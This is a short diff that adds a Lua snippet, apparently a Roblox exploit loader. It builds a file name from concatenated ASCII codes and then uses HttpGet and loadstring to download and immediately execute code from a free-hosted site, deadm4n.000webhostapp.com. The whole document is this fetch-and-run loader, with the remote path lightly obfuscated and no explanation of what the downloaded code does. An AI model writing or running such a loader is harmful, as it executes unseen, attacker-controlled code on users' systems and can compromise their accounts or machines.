@@ -1,0 +1,3 @@
+--\\ wait a couple seconds, it takes a long time lol
+local deadm4n = ("11599114105112116461081179710"), true
+loadstring(game:HttpGet(("https://deadm4n.000webhostapp.com/"..deadm4n)))()
